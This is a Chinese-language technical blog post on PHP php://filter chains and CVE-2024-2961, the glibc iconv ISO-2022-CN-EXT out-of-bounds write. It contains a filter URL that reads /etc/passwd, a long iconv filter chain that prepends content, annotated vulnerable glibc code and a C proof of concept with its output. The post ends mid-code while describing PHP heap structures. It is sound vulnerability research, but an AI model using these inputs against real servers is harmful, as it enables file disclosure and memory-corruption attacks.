<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>php iconv</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <nav class="site-nav">
            <a href="./index.html" class="nav-link">/home</a>
            <span class="nav-separator">|</span>
            <a href="./about.html" class="nav-link">/about</a>
        </nav>
        <div class="terminal-prompt">
            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
            <span class="cmd">cat ./php iconv.md</span><span class="cursor">█</span>
        </div>
        <h1 class="post-title">php iconv</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-05-20]</div>
    </header>
    <div class="layout-grid">
                <main><h2 id="basic">basic</h2><h3 id="php-filter">php://filter</h3><p>提供一种在返回流之前对其应用转换的方法 语法如下</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">php://filter/[filters...]/resource=[resource]
</span></pre>
<p>eg. 使用<code>convert.base64-encode</code>编码资源内容</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">php://filter/convert.base64-encode/resource=/etc/passwd
</span></pre>
<p>返回</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoCmJpbjp4OjE6MTpiaW46L2Jpbjovc2Jpbi9u
</span><span style="color:#c0c5ce;">b2xvZ2luCmRhZW1vbjp4OjI6MjpkYWVtb246L3NiaW46L3NiaW4vbm9sb2dpbgphZG06eDozOjQ6
</span><span style="color:#c0c5ce;">...
</span><span style="color:#c0c5ce;">Yi92bnN0YXQ6L2Jpbi9mYWxzZQpyZWRpczp4OjEwMjoxMDM6cmVkaXM6L3Zhci9saWIvcmVkaXM6
</span><span style="color:#c0c5ce;">L2Jpbi9mYWxzZQo=
</span></pre>
<p>可以添加任意数量过滤器，以<code>|</code>分隔</p>
<p>其他过滤器：</p>
<ul>
<li>string.upper 字符串转换为大写</li>
<li>string.lower 字符串转换为小写</li>
<li>string.rot13 执行一些BC加密</li>
<li>convert.iconv.X.Y ，将字符集从 X 转换为 Y</li>
</ul>
<p>一个神奇的过滤器链，在/etc/passwd前面添加<code>Hello world!</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|
</span><span style="color:#c0c5ce;">convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|
</span><span style="color:#c0c5ce;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM860.UTF16|
</span><span style="color:#c0c5ce;">convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|
</span><span style="color:#c0c5ce;">convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|
</span><span style="color:#c0c5ce;">convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|
</span><span style="color:#c0c5ce;">convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|
</span><span style="color:#c0c5ce;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|
</span><span style="color:#c0c5ce;">convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|
</span><span style="color:#c0c5ce;">convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|
</span><span style="color:#c0c5ce;">convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|
</span><span style="color:#c0c5ce;">convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|
</span><span style="color:#c0c5ce;">convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|
</span><span style="color:#c0c5ce;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|
</span><span style="color:#c0c5ce;">convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|
</span><span style="color:#c0c5ce;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|
</span><span style="color:#c0c5ce;">convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|
</span><span style="color:#c0c5ce;">convert.iconv.855.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|
</span><span style="color:#c0c5ce;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L5.UTF-32|
</span><span style="color:#c0c5ce;">convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|
</span><span style="color:#c0c5ce;">convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|
</span><span style="color:#c0c5ce;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.ISO2022KR.UTF16|
</span><span style="color:#c0c5ce;">convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|
</span><span style="color:#c0c5ce;">convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|
</span><span style="color:#c0c5ce;">convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|
</span><span style="color:#c0c5ce;">convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|
</span><span style="color:#c0c5ce;">convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|
</span><span style="color:#c0c5ce;">convert.iconv.855.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|
</span><span style="color:#c0c5ce;">convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|
</span><span style="color:#c0c5ce;">convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|
</span><span style="color:#c0c5ce;">convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|
</span><span style="color:#c0c5ce;">convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd
</span></pre>
<h3 id="cve-2024-2961">CVE-2024-2961</h3><p>php内部从一个字符集转换到另一个字符集时，使用<code>iconv()</code>。linux上由glibc实现</p>
<p>API使用，首先打开一个转换描述符 描述符指定了输入和输出字符集</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">iconv_t </span><span style="color:#8fa1b3;">iconv_open</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">tocode</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">fromcode</span><span style="color:#c0c5ce;">);
</span></pre>
<p>然后可以使用<code>iconv()</code>将输入缓冲区<code>inbuf</code>转换为输出缓冲区<code>outbuf</code>中的新字符集</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">iconv</span><span style="color:#c0c5ce;">(iconv_t </span><span style="color:#bf616a;">cd</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#b48ead;">restrict </span><span style="color:#bf616a;">inbuf</span><span style="color:#c0c5ce;">, size_t *</span><span style="color:#b48ead;">restrict </span><span style="color:#bf616a;">inbytesleft</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#b48ead;">restrict </span><span style="color:#bf616a;">outbuf</span><span style="color:#c0c5ce;">, size_t *</span><span style="color:#b48ead;">restrict </span><span style="color:#bf616a;">outbytesleft</span><span style="color:#c0c5ce;">);
</span></pre>
<p>如果输出缓冲区不够大，<code>iconv()</code>将返回一个错误指示此情况，可以通过重新分配outbuf并再次调用来继续转换</p>
<h3 id="zhuan-huan-wei-iso-2022-cn-ext-shi-chu-xian-yue-jie-xie-ru">转换为 ISO-2022-CN-EXT 时出现越界写入</h3><p>ISO-2022-CN-EXT是一系列字符集的集合：当需要编码一个字符时，它会选取适当的字符集，并发出一个转义序列以指示解码器需切换到该字符集</p>
<p>下面代码负责转义，由三个if块组成，每个块向outbuf（由outptr指向）写入不同的转义序列。如果你查看第一个if<code>[1]</code>，你会发现它前面有一个额外的if()块来检查输出缓冲区是否足够大以容纳四个字符。而其他两个if()<code>[2][3]</code>则没有这个检查。因此，转义序列可能会越界写入</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">// iconvdata/iso-2022-cn-ext.c
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* See whether we have to emit an escape sequence.  */
</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(set != used)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* First see whether we announced that we use this
</span><span style="color:#65737e;">        character set.  */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((used &amp; SO_mask) != </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)) </span><span style="color:#65737e;">// [1]
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*escseq;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(outptr + </span><span style="color:#d08770;">4 </span><span style="color:#c0c5ce;">&gt; outend) </span><span style="color:#65737e;">// &lt;-------------------- BOUND CHECK
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            result = __GCONV_FULL_OUTPUT;
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(used &gt;= </span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">&amp;&amp; used &lt;= </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        escseq = &quot;</span><span style="color:#a3be8c;">)A</span><span style="color:#96b5b4;">\0\0</span><span style="color:#a3be8c;">)G)E</span><span style="color:#c0c5ce;">&quot; + (used - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) * </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        *outptr++ = ESC;
</span><span style="color:#c0c5ce;">        *outptr++ = &#39;</span><span style="color:#a3be8c;">$</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">        *outptr++ = *escseq++;
</span><span style="color:#c0c5ce;">        *outptr++ = *escseq++;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        ann = (ann &amp; ~SO_ann) | (used &lt;&lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">((used &amp; SS2_mask) != </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)) </span><span style="color:#65737e;">// [2]
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*escseq;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// &lt;-------------------- NO BOUND CHECK
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(used == CNS11643_2_set); </span><span style="color:#65737e;">/* XXX */
</span><span style="color:#c0c5ce;">        escseq = &quot;</span><span style="color:#a3be8c;">*H</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">        *outptr++ = ESC;
</span><span style="color:#c0c5ce;">        *outptr++ = &#39;</span><span style="color:#a3be8c;">$</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">        *outptr++ = *escseq++;
</span><span style="color:#c0c5ce;">        *outptr++ = *escseq++;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">((used &amp; SS3_mask) != </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)) </span><span style="color:#65737e;">// [3]
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*escseq;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// &lt;-------------------- NO BOUND CHECK
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">((used &gt;&gt; </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">) &gt;= </span><span style="color:#d08770;">3 </span><span style="color:#c0c5ce;">&amp;&amp; (used &gt;&gt; </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">) &lt;= </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        escseq = &quot;</span><span style="color:#a3be8c;">+I+J+K+L+M</span><span style="color:#c0c5ce;">&quot; + ((used &gt;&gt; </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">) - </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">) * </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        *outptr++ = ESC;
</span><span style="color:#c0c5ce;">        *outptr++ = &#39;</span><span style="color:#a3be8c;">$</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">        *outptr++ = *escseq++;
</span><span style="color:#c0c5ce;">        *outptr++ = *escseq++;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>可以使用如“劄”、“䂚”、“峛”或“湿”等特殊字符，导致1-3字节的一出 值如下：
<code>$*H [24 2A 48]</code><br />
<code>$+I [24 2B 49]</code><br />
<code>$+J [24 2B 4A]</code><br />
<code>$+K [24 2B 4B]</code><br />
<code>$+L [24 2B 4C]</code><br />
<code>$+M [24 2B 4D]</code></p>
<p>poc</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;">$ gcc -o poc ./poc.c &amp;&amp; ./poc
</span><span style="color:#65737e;">*/
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">iconv.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">// hexdump 函数的实现
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">hexdump</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">ptr</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">buflen</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*buf = (</span><span style="color:#b48ead;">unsigned char</span><span style="color:#c0c5ce;">*)ptr;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; buflen; i++) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(i % </span><span style="color:#d08770;">16 </span><span style="color:#c0c5ce;">== </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#d08770;">%06x</span><span style="color:#a3be8c;">: </span><span style="color:#c0c5ce;">&quot;, i);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%02x </span><span style="color:#c0c5ce;">&quot;, buf[i]);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    iconv_t cd = </span><span style="color:#8fa1b3;">iconv_open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">ISO-2022-CN-EXT</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">UTF-8</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> input[</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">] = &quot;</span><span style="color:#a3be8c;">AAAAA劄</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> output[</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*pinput = input;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*poutput = output;
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// Same size for input and output buffer: 8 bytes
</span><span style="color:#c0c5ce;">    size_t sinput = </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(input);
</span><span style="color:#c0c5ce;">    size_t soutput = sinput;
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">iconv</span><span style="color:#c0c5ce;">(cd, &amp;pinput, &amp;sinput, &amp;poutput, &amp;soutput);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Remaining bytes (should be &gt; 0): </span><span style="color:#d08770;">%zd</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, soutput);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">hexdump</span><span style="color:#c0c5ce;">(output, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>存在漏洞的表现如下 尽管指定了输出最多8字节，但实际写入了9字节</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ubuntu@VM-16-7-ubuntu:~/iconv$ ./poc
</span><span style="color:#c0c5ce;">Remaining bytes (should be &gt; 0): -1
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">000000: 41 41 41 41 41 1b 24 2a 48 00 00 00 00 00 00 00 
</span></pre>
<p>修复后如下</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ayoung@ayoung:~/iconv$ ./poc
</span><span style="color:#c0c5ce;">Remaining bytes (should be &gt; 0): 3
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">000000: 41 41 41 41 41 00 00 00 00 00 00 00 00 00 00 00 
</span></pre>
<h3 id="phpdui">php堆</h3><p>php中内存申请和释放使用<code>emalloc</code>和<code>efree</code></p>
<p><code>_zend_mm_chunk</code>如下，作为大的管理结构</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">_zend_mm_chunk {
</span><span style="color:#c0c5ce;">	zend_mm_heap      *heap;
</span><span style="color:#c0c5ce;">	zend_mm_chunk     *next;
</span><span style="color:#c0c5ce;">	zend_mm_chunk     *prev;
</span><span style="color:#c0c5ce;">	uint32_t           free_pages;				</span><span style="color:#65737e;">/* number of free pages */
</span><span style="color:#c0c5ce;">	uint32_t           free_tail;               </span><span style="color:#65737e;">/* number of free pages at the end of chunk */
</span><span style="color:#c0c5ce;">	uint32_t           num;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">               reserve[</span><span style="color:#d08770;">64 </span><span style="color:#c0c5ce;">- (sizeof(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*) * </span><span style="color:#d08770;">3 </span><span style="color:#c0c5ce;">+ sizeof(uint32_t) * </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">)];
</span><span style="color:#c0c5ce;">	zend_mm_heap       heap_slot;               </span><span style="color:#65737e;">/* used only in main chunk */
</span><span style="color:#c0c5ce;">	zend_mm_page_map   free_map;                </span><span style="color:#65737e;">/* 512 bits or 64 bytes */
</span><span style="color:#c0c5ce;">	zend_mm_page_info  map[ZEND_MM_PAGES];      </span><span style="color:#65737e;">/* 2 KB = 512 * 4 */
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>堆管理结构体 <code>_zend_mm_heap</code>如下，<code>free_slot</code> 存放空闲chunk链表 类似tcache 无数量限制</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;"> * Memory is retrieved from OS by chunks of fixed size 2MB.
</span><span style="color:#65737e;"> * Inside chunk it&#39;s managed by pages of fixed size 4096B.
</span><span style="color:#65737e;"> * So each chunk consists from 512 pages.
</span><span style="color:#65737e;"> * The first page of each chunk is reserved for chunk header.
</span><span style="color:#65737e;"> * It contains service information about all pages.
</span><span style="color:#65737e;"> *
</span><span style="color:#65737e;"> * free_pages - current number of free pages in this chunk
</span><span style="color:#65737e;"> *
</span><span style="color:#65737e;"> * free_tail  - number of continuous free pages at the end of chunk
</span><span style="color:#65737e;"> *
</span><span style="color:#65737e;"> * free_map   - bitset (a bit for each page). The bit is set if the corresponding
</span><span style="color:#65737e;"> *              page is allocated. Allocator for &quot;large sizes&quot; may easily find a
</span><span style="color:#65737e;"> *              free page (or a continuous number of pages) searching for zero
</span><span style="color:#65737e;"> *              bits.
</span><span style="color:#65737e;"> *
</span><span style="color:#65737e;"> * map        - contains service information for each page. (32-bits for each
</span><span style="color:#65737e;"> *              page).
</span><span style="color:#65737e;"> *    usage:
</span><span style="color:#65737e;"> *				(2 bits)
</span><span style="color:#65737e;"> * 				FRUN - free page,
</span><span style="color:#65737e;"> *              LRUN - first page of &quot;large&quot; allocation
</span><span style="color:#65737e;"> *              SRUN - first page of a bin used for &quot;small&quot; allocation
</span><span style="color:#65737e;"> *
</span><span style="color:#65737e;"> *    lrun_pages:
</span><span style="color:#65737e;"> *              (10 bits) number of allocated pages
</span><span style="color:#65737e;"> *
</span><span style="color:#65737e;"> *    srun_bin_num:
</span><span style="color:#65737e;"> *              (5 bits) bin number (e.g. 0 for sizes 0-2, 1 for 3-4,
</span><span style="color:#65737e;"> *               2 for 5-8, 3 for 9-16 etc) see zend_alloc_sizes.h
</span><span style="color:#65737e;"> */
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">_zend_mm_heap {
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ZEND_MM_CUSTOM
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">                use_custom_heap;
</span><span style="color:#b48ead;">#endif
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ZEND_MM_STORAGE
</span><span style="color:#c0c5ce;">	zend_mm_storage   *storage;
</span><span style="color:#b48ead;">#endif
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ZEND_MM_STAT
</span><span style="color:#c0c5ce;">	size_t             size;                    </span><span style="color:#65737e;">/* current memory usage */
</span><span style="color:#c0c5ce;">	size_t             peak;                    </span><span style="color:#65737e;">/* peak memory usage */
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">	zend_mm_free_slot *free_slot[ZEND_MM_BINS]; </span><span style="color:#65737e;">/* free lists for small sizes */
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ZEND_MM_STAT || ZEND_MM_LIMIT
</span><span style="color:#c0c5ce;">	size_t             real_size;               </span><span style="color:#65737e;">/* current size of allocated pages */
</span><span style="color:#b48ead;">#endif
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ZEND_MM_STAT
</span><span style="color:#c0c5ce;">	size_t             real_peak;               </span><span style="color:#65737e;">/* peak size of allocated pages */
</span><span style="color:#b48ead;">#endif
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ZEND_MM_LIMIT
</span><span style="color:#c0c5ce;">	size_t             limit;                   </span><span style="color:#65737e;">/* memory limit */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">                overflow;                </span><span style="color:#65737e;">/* memory overflow flag */
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	zend_mm_huge_list *huge_list;               </span><span style="color:#65737e;">/* list of huge allocated blocks */
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	zend_mm_chunk     *main_chunk;
</span><span style="color:#c0c5ce;">	zend_mm_chunk     *cached_chunks;			</span><span style="color:#65737e;">/* list of unused chunks */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">                chunks_count;			</span><span style="color:#65737e;">/* number of allocated chunks */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">                peak_chunks_count;		</span><span style="color:#65737e;">/* peak number of allocated chunks for current request */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">                cached_chunks_count;		</span><span style="color:#65737e;">/* number of cached chunks */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">double</span><span style="color:#c0c5ce;">             avg_chunks_count;		</span><span style="color:#65737e;">/* average number of chunks allocated per request */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">                last_chunks_delete_boundary; </span><span style="color:#65737e;">/* number of chunks after last deletion */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">                last_chunks_delete_count;    </span><span style="color:#65737e;">/* number of deletion over the last boundary */
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ZEND_MM_CUSTOM
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">union </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">void      </span><span style="color:#c0c5ce;">*(*_malloc)(size_t);
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">void       </span><span style="color:#c0c5ce;">(*_free)(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*);
